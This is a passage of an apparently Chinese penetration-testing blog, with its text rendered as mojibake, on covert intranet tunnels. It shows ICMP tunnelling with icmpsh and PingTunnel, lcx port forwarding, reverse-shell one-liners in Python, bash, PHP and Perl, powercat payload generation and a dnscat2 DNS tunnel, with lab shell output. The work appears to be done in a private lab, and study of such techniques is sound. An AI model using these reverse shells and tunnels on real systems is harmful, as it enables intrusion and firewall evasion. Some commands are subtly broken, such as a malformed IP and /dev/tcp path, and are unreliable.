title="2.ICMPéš§é“"></a>2.ICMPéš§é“</h3><blockquote><p>åœ¨ä¸€èˆ¬çš„é€šä¿¡åè®®é‡Œï¼Œå¦‚æœä¸¤å°è®¾å¤‡è¦è¿›è¡Œé€šä¿¡ï¼Œé¦–å…ˆè‚¯å®šéœ€è¦å¼€æ”¾ç«¯å£ï¼Œè€Œåœ¨ICMPä¸‹å°±ä¸éœ€è¦ï¼Œåœ¨ä¸€äº›ç½‘ç»œç¯å¢ƒä¸­å¦‚æœä½¿ç”¨å„ç±»ä¸Šå±‚éš§é“ï¼ˆHTTPã€DNSã€å¸¸è§„æ­£åå‘ç«¯å£è½¬å‘ç­‰ï¼‰è¿›è¡Œçš„æ“ä½œéƒ½å¤±è´¥åï¼Œå¸¸å¸¸ä¼šé€šè¿‡pingå‘½ä»¤è®¿é—®è¿œç¨‹è®¡ç®—æœºï¼Œå°è¯•å»ºç«‹ICMPéš§é“ï¼Œå°†TCP/UDPæ•°æ®å°è£…åœ¨ICMPçš„pingæ•°æ®åŒ…ä¸­ï¼Œä»è€Œç©¿è¿‡é˜²ç«å¢™ã€‚</p></blockquote><p><code>å¸¸ç”¨çš„ICMPéš§é“å·¥å…·æœ‰icmpshã€PingTunnelã€icmptunnelã€powershell icmpç­‰ï¼š</code></p><h4 id="01-icmpsh"><a href="#01-icmpsh" class="headerlink" title="01.icmpsh"></a>01.icmpsh</h4><p><code>åˆ©ç”¨</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">æœ¬æœºï¼špython2 icmpsh_m.py &lt;æœ¬æœºIP&gt; &lt;ç›®æ ‡IP&gt;</span><br><span class="line">é¶æœºï¼šicmpsh -t &lt;å¤–è¿ä¸»æœºIP&gt; -d 500 -b 30 -s 128</span><br></pre></td></tr></table></figure><p><code>é¦–å…ˆéœ€è¦å®‰è£…impacket</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ä¸‹è½½åœ°å€ï¼šhttps://github.com/SecureAuthCorp/impacket</span><br><span class="line">cd impacket</span><br><span class="line">python2 -m pip install .</span><br></pre></td></tr></table></figure><p><code>å…ˆåœ¨kaliä¸Šè¿è¡Œ</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 icmpsh_m.py 192.168.1.8 192.168.1.6</span><br></pre></td></tr></table></figure><p><code>åœ¨é¶æœºä¸Šè¿è¡Œ</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">icmpsh -t 192.168.1.8 -d 500 -b 30 -s 128</span><br></pre></td></tr></table></figure><p><code>å¾—åˆ°shell</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/Downloads/icmpsh# python2 icmpsh_m.py 192.168.1.8 192.168.1.6</span><br><span class="line">Microsoft Windows [ï¿½æ±¾ 5.2.3790]</span><br><span class="line">(C) ï¿½ï¿½È¨ï¿½ï¿½ï¿½ï¿½ 1985-2003 Microsoft Corp.</span><br><span class="line"></span><br><span class="line">C:\icmpsh&gt;whoami</span><br><span class="line">whoami</span><br><span class="line">admin-ad4c9d4d8\administrator</span><br><span class="line"></span><br><span class="line">C:\icmpsh&gt;ipconfig</span><br><span class="line">ipconfig</span><br><span class="line"></span><br><span class="line">Windows IP Configuration</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Ethernet adapter ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½:</span><br><span class="line"></span><br><span class="line">   Connection-specific DNS Suffix  . : local</span><br><span class="line">   IP Address. . . . . . . . . . . . : 10.1.1.4</span><br><span class="line">   Subnet Mask . . . . . . . . . . . : 255.255.255.0</span><br><span class="line">   Default Gateway . . . . . . . . . : 10.1.1.1</span><br><span class="line"></span><br><span class="line">Ethernet adapter ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ 2:</span><br><span class="line"></span><br><span class="line">   Connection-specific DNS Suffix  . : </span><br><span class="line">   IP Address. . . . . . . . . . . . : 192.168.1.6</span><br><span class="line">   Subnet Mask . . . . . . . . . . . : 255.255.255.0</span><br><span class="line">   Default Gateway . . . . . . . . . : 192.168.1.1</span><br><span class="line"></span><br><span class="line">C:\icmpsh&gt;</span><br></pre></td></tr></table></figure><p><code>æŠ“åŒ…åˆ†æ</code></p><blockquote><p>192.168.1.10å‘192.168.1.6å‘èµ·è¯·æ±‚whoami</p></blockquote><img src="/2021/07/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20210722121825789.png" class><blockquote><p>192.168.1.6å‘192.168.1.10å“åº”</p></blockquote><img src="/2021/07/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20210722121936653.png" class><h4 id="02-PingTunnel"><a href="#02-PingTunnel" class="headerlink" title="02.PingTunnel"></a>02.PingTunnel</h4><p><code>å®‰è£…ä¾èµ–</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> cd libpcap-1.10.1</span><br><span class="line">./configure</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"></span><br><span class="line">cd PingTunnel/</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"></span><br><span class="line">é‡åˆ°æŠ¥é”™å®‰è£…ä»¥ä¸‹</span><br><span class="line">apt-get install flex byacc -y #æˆ‘é‡åˆ°çš„æŠ¥é”™æ˜¯ç¼ºè¿™ä¿©</span><br></pre></td></tr></table></figure><p><code>åˆ©ç”¨</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">kaliæ”»å‡»æœº</span><br><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~]</span><br><span class="line">â””â”€# ifconfig                                                                                                                                             71 â¨¯</span><br><span class="line">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.1.7  netmask 255.255.255.0  broadcast 192.168.1.255</span><br><span class="line">        inet6 2409:8a15:3637:5ed0:befd:d9fb:f05a:6005  prefixlen 64  scopeid 0x0&lt;global&gt;</span><br><span class="line">        inet6 fe80::20c:29ff:fe4f:2524  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        inet6 2409:8a15:3637:5ed0:20c:29ff:fe4f:2524  prefixlen 64  scopeid 0x0&lt;global&gt;</span><br><span class="line">        ether 00:0c:29:4f:25:24  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 12484  bytes 6520141 (6.2 MiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 3141  bytes 662478 (646.9 KiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class="line">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class="line">        RX packets 44  bytes 2816 (2.7 KiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 44  bytes 2816 (2.7 KiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">webæœåŠ¡å™¨</span><br><span class="line">[root@mail ~]# ifconfig</span><br><span class="line">ens32: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.1.11  netmask 255.255.255.0  broadcast 192.168.1.255</span><br><span class="line">        inet6 2409:8a15:3637:5ed0:63bf:e247:b694:9bca  prefixlen 64  scopeid 0x0&lt;global&gt;</span><br><span class="line">        inet6 fe80::93f3:83a7:a47f:dda4  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 00:0c:29:a0:ac:5d  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 7482  bytes 1008757 (985.1 KiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 3140  bytes 833053 (813.5 KiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">ens34: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 10.1.1.6  netmask 255.255.255.0  broadcast 10.1.1.255</span><br><span class="line">        inet6 fe80::5577:a12e:72b8:66dd  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 00:0c:29:a0:ac:67  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 851  bytes 366945 (358.3 KiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 509  bytes 68150 (66.5 KiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class="line">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class="line">        RX packets 109  bytes 6323 (6.1 KiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 109  bytes 6323 (6.1 KiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">å†…ç½‘DC</span><br><span class="line">C:\Users\Administrator&gt;ipconfig</span><br><span class="line"></span><br><span class="line">Windows IP é…ç½®</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ä»¥å¤ªç½‘é€‚é…å™¨ Ethernet0:</span><br><span class="line"></span><br><span class="line">   è¿æ¥ç‰¹å®šçš„ DNS åç¼€ . . . . . . . : local</span><br><span class="line">   æœ¬åœ°é“¾æ¥ IPv6 åœ°å€. . . . . . . . : fe80::b12d:4163:32df:fa72%4</span><br><span class="line">   IPv4 åœ°å€ . . . . . . . . . . . . : 10.1.1.5</span><br><span class="line">   å­ç½‘æ©ç   . . . . . . . . . . . . : 255.255.255.0</span><br><span class="line">   é»˜è®¤ç½‘å…³. . . . . . . . . . . . . : 10.1.1.1</span><br></pre></td></tr></table></figure><p><code>é¦–å…ˆwebæœåŠ¡å™¨è¿è¡Œ</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ptunnel -x pass</span><br></pre></td></tr></table></figure><p><code>kaliè¿è¡Œ</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ptunnel -p 192.168.1.11 -lp 6666 -da 10.1.1.5 -dp 3389 -x pass</span><br><span class="line">ä¸Šè¿°å‘½ä»¤å«ä¹‰ï¼šåœ¨è®¿é—®kaliçš„6666ç«¯å£ï¼Œä¼šæŠŠDC 10.1.1.5çš„3389ç«¯å£å°è£…åœ¨ICMPéš§é“é‡Œï¼Œä»¥webæœåŠ¡å™¨192.168.1.11ä¸ºICMPéš§é“è·³æ¿è¿›è¡Œä¼ é€ã€‚</span><br></pre></td></tr></table></figure><p><code>å‚æ•°</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-x    æŒ‡å®šICMPéš§é“è¿æ¥çš„éªŒè¯å¯†ç </span><br><span class="line">-lp æŒ‡å®šæœ¬åœ°ç›‘å¬çš„TCPç«¯å£</span><br><span class="line">-da æŒ‡å®šè¦è½¬å‘çš„ç›®æ ‡æœºå™¨IP</span><br><span class="line">-dp æŒ‡å®šè¦è½¬å‘çš„ç›®æ ‡æœºå™¨TCPç«¯å£</span><br><span class="line">-p  æŒ‡å®šICMPéš§é“å¦ä¸€ç«¯æœºå™¨çš„IP</span><br></pre></td></tr></table></figure><p><code>ç™»å…¥</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">desktop 192.168.1.7:6666</span><br><span class="line">desktop 127.0.0.1:6666</span><br><span class="line">windowsçš„mstscç™»å…¥ä¹Ÿå¯ä»¥</span><br></pre></td></tr></table></figure><img src="/2021/07/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20210722145522318.png" class><img src="/2021/07/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20210722150059749.png" class><img src="/2021/07/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20210722150435797.png" class><img src="/2021/07/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20210722150519192.png" class><h2 id="0x03-ä¼ è¾“å±‚éš§é“"><a href="#0x03-ä¼ è¾“å±‚éš§é“" class="headerlink" title="0x03.ä¼ è¾“å±‚éš§é“"></a>0x03.ä¼ è¾“å±‚éš§é“</h2><h3 id="1-lcxå†…ç½‘ç«¯å£è½¬å‘"><a href="#1-lcxå†…ç½‘ç«¯å£è½¬å‘" class="headerlink" title="1.lcxå†…ç½‘ç«¯å£è½¬å‘"></a>1.lcxå†…ç½‘ç«¯å£è½¬å‘</h3><p><code>ç›®æ ‡ä¸»æœºæ‰§è¡Œ</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx.exe -slave 192.168.1.2 4444 127.0.0.1 3389    # å°†æœ¬æœº3389ç«¯å£è½¬å‘åˆ°hackæœº4444ç«¯å£</span><br></pre></td></tr></table></figure><p><code>hackæœºæ‰§è¡Œ</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx.exe -listen  4444 5555    #å°†æœ¬æœº4444ç«¯å£ç›‘å¬çš„æ‰€æœ‰æ•°æ®ä¼ è¾“åˆ°5555ç«¯å£</span><br></pre></td></tr></table></figure><p><code>hackæœºmstsc 127.0.0.1:5555ç™»å…¥</code></p><img src="/2021/07/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20210722184135571.png" class><img src="/2021/07/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20210722184150355.png" class><h3 id="2-nc"><a href="#2-nc" class="headerlink" title="2.nc"></a>2.nc</h3><p><code>å‚æ•°</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">-d åå°æ¨¡å¼</span><br><span class="line">-e ç¨‹åºé‡å®šå‘</span><br><span class="line">-g &lt;ç½‘å…³&gt; è®¾ç½®è·¯ç”±å™¨è·ƒç¨‹é€šä¿¡ç½‘å…³ï¼Œæœ€å¤šå¯è®¾ç½®8ä¸ªï¼›</span><br><span class="line">-G &lt;æŒ‡å‘å™¨æ•°ç›®&gt; è®¾ç½®æ¥æºè·¯ç”±æŒ‡å‘å™¨ï¼Œå…¶æ•°å€¼ä¸º4çš„å€æ•°ï¼›</span><br><span class="line">-h åœ¨çº¿å¸®åŠ©ï¼›</span><br><span class="line">-i &lt;å»¶è¿Ÿç§’æ•°&gt; è®¾ç½®æ—¶é—´é—´éš”ï¼Œä»¥ä¾¿ä¼ é€ä¿¡æ¯åŠæ‰«æé€šä¿¡ç«¯å£ï¼›</span><br><span class="line">-l ä½¿ç”¨ç›‘å¬æ¨¡å¼ï¼Œç®¡æ§ä¼ å…¥çš„èµ„æ–™ï¼›</span><br><span class="line">-n ç›´æ¥ä½¿ç”¨IPåœ°å€ï¼Œè€Œä¸é€šè¿‡åŸŸåæœåŠ¡å™¨ï¼›</span><br><span class="line">-o &lt;è¾“å‡ºæ–‡ä»¶&gt; æŒ‡å®šæ–‡ä»¶åç§°ï¼ŒæŠŠå¾€æ¥ä¼ è¾“çš„æ•°æ®ä»¥16è¿›åˆ¶å­—ç å€¾å€’æˆè¯¥æ–‡ä»¶ä¿å­˜ï¼›</span><br><span class="line">-p &lt;é€šä¿¡ç«¯å£&gt; è®¾ç½®æœ¬åœ°ä¸»æœºä½¿ç”¨çš„é€šä¿¡ç«¯å£ï¼›</span><br><span class="line">-r éšæœºæŒ‡å®šæœ¬åœ°ä¸è¿œç«¯ä¸»æœºçš„é€šä¿¡ç«¯å£ï¼›</span><br><span class="line">-s &lt;æ¥æºä½å€&gt; è®¾ç½®æœ¬åœ°ä¸»æœºé€å‡ºæ•°æ®åŒ…çš„IPåœ°å€ï¼›</span><br><span class="line">-u ä½¿ç”¨UDPä¼ è¾“åè®®ï¼›</span><br><span class="line">-v è¯¦ç»†è¾“å‡ºï¼›</span><br><span class="line">-w &lt;è¶…æ—¶ç§’æ•°&gt; è®¾ç½®ç­‰å¾…è¿çº¿çš„æ—¶é—´ï¼›</span><br><span class="line">-z å°†è¾“å…¥è¾“å‡ºå…³æ‰ï¼Œåªåœ¨æ‰«æé€šä¿¡ç«¯å£æ—¶ä½¿ç”¨ã€‚</span><br></pre></td></tr></table></figure><h3 id="3-åå¼¹shell"><a href="#3-åå¼¹shell" class="headerlink" title="3.åå¼¹shell"></a>3.åå¼¹shell</h3><h4 id="01-pythonåå¼¹shell"><a href="#01-pythonåå¼¹shell" class="headerlink" title="01.pythonåå¼¹shell"></a>01.pythonåå¼¹shell</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.1681.11&quot;,6666));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="02-bashåå¼¹shell"><a href="#02-bashåå¼¹shell" class="headerlink" title="02.bashåå¼¹shell"></a>02.bashåå¼¹shell</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp 192.168.1.11/6666 0&gt;&amp;1</span><br></pre></td></tr></table></figure><h4 id="03-PHPåå¼¹shell"><a href="#03-PHPåå¼¹shell" class="headerlink" title="03.PHPåå¼¹shell"></a>03.PHPåå¼¹shell</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;192.168.1.11&quot;,6666);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="04-Perlåå¼¹shell"><a href="#04-Perlåå¼¹shell" class="headerlink" title="04.Perlåå¼¹shell"></a>04.Perlåå¼¹shell</h4><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e <span class="string">&#x27;use Socket;$i=&quot;192.168.1.11&quot;;$p=6666;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="4-powercat"><a href="#4-powercat" class="headerlink" title="4.powercat"></a>4.powercat</h3><p><code>Powershellç‰ˆnc</code></p><p><code>å‚æ•°</code></p><table><thead><tr><th><strong>å‚æ•°</strong></th><th><strong>åŠŸèƒ½</strong></th></tr></thead><tbody><tr><td>-l</td><td>ç›‘å¬å…¥ç«™è¿æ¥</td></tr><tr><td>-c</td><td>è¿æ¥ç›®æ ‡</td></tr><tr><td>-p</td><td>è¿æ¥æˆ–ç›‘å¬çš„ç«¯å£</td></tr><tr><td>-e</td><td>è¿”å›æŸä¸ªç¨‹åº</td></tr><tr><td>-ep</td><td>è¿”å›PowerShel</td></tr><tr><td>-r</td><td>ç«¯å£è½¬å‘</td></tr><tr><td>-u</td><td>é€šè¿‡UDPéš§é“ä¼ è¾“æ•°æ®</td></tr><tr><td>-dns</td><td>é€šè¿‡DNSéš§é“ä¼ è¾“æ•°æ®</td></tr><tr><td>-dnsft</td><td>DNSå¤±æ•ˆé˜ˆå€¼</td></tr><tr><td>-t</td><td>è¶…æ—¶é€‰é¡¹ã€‚é»˜è®¤å€¼ï¼š60</td></tr><tr><td>-i</td><td>è¾“å…¥ï¼šæ–‡ä»¶è·¯å¾„ï¼ˆå­—ç¬¦ä¸²ï¼‰ã€å­—èŠ‚æ•°ç»„æˆ–å­—ç¬¦ä¸²</td></tr><tr><td>-o</td><td>æ§åˆ¶å°è¾“å‡ºç±»å‹ï¼šâ€œä¸»æœºâ€ã€â€œå­—èŠ‚â€æˆ–â€œå­—ç¬¦ä¸²â€</td></tr><tr><td>-of</td><td>è¾“å‡ºæ–‡ä»¶è·¯å¾„</td></tr><tr><td>-d</td><td>è¿æ¥åæ–­å¼€</td></tr><tr><td>-rep</td><td>é‡æ–°å¯åŠ¨</td></tr><tr><td>-g</td><td>ç”Ÿæˆæœ‰æ•ˆè½½è·</td></tr><tr><td>-ge</td><td>ç”Ÿæˆç¼–ç åçš„æœ‰æ•ˆè½½è·</td></tr><tr><td>-h</td><td>å¸®åŠ©ä¿¡æ¯</td></tr></tbody></table><h4 id="01-Powercatç”Ÿæˆpayload"><a href="#01-Powercatç”Ÿæˆpayload" class="headerlink" title="01.Powercatç”Ÿæˆpayload"></a>01.Powercatç”Ÿæˆpayload</h4><h5 id="1-æ­£å‘shell"><a href="#1-æ­£å‘shell" class="headerlink" title="1.æ­£å‘shell"></a>1.æ­£å‘shell</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powercat -l -p 6666 -e cmd -v -g &gt;&gt; shell.ps1</span><br></pre></td></tr></table></figure><p><code>è¿æ¥</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powercat -c 10.10.10.10 -p 6666 -v</span><br></pre></td></tr></table></figure><h5 id="2-åå‘shell"><a href="#2-åå‘shell" class="headerlink" title="2.åå‘shell"></a>2.åå‘shell</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powercat -c 10.10.10.10 -p 6666 -e cmd -v -g &gt;&gt; demo.ps1</span><br></pre></td></tr></table></figure><p><code>è¿æ¥</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powercat -l -p 6666 -v</span><br></pre></td></tr></table></figure><h4 id="02-powercat-DNSéš§é“"><a href="#02-powercat-DNSéš§é“" class="headerlink" title="02.powercat DNSéš§é“"></a>02.powercat DNSéš§é“</h4><p><code>powercat DNSéš§é“æ˜¯åŸºäºdnscatè®¾è®¡çš„ï¼Œé¦–å…ˆå®‰è£…dnscat</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/iagox86/dnscat2.git</span><br><span class="line">cd dnscat2/server/</span><br><span class="line">gem install bundler</span><br><span class="line">bundle install</span><br></pre></td></tr></table></figure><p><code>kaliæ‰§è¡Œ</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby dnscat2.rb ttpowercat.test -e open --no-cache</span><br></pre></td></tr></table></figure><p><code>ç›®æ ‡ä¸»æœºæ‰§è¡Œ</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powercat -c 192.168.1.7 -p 53 -dns ttpowercat.test -e cmd.exe</span><br></pre></td></tr></table></figure><p><code>å¾—åˆ°shell</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">dnscat2&gt;</span><span class="bash"> New window created: 1</span></span><br><span class="line">Session 1 security: UNENCRYPTED</span><br><span class="line"></span><br><span class="line"><span class="meta">dnscat2&gt;</span><span class="bash"> session -i 1</span></span><br><span class="line">New window created: 1</span><br><span class="line">history_size (session) =&gt; 1000</span><br><span class="line">Session 1 security: UNENCRYPTED</span><br><span class="line">This is 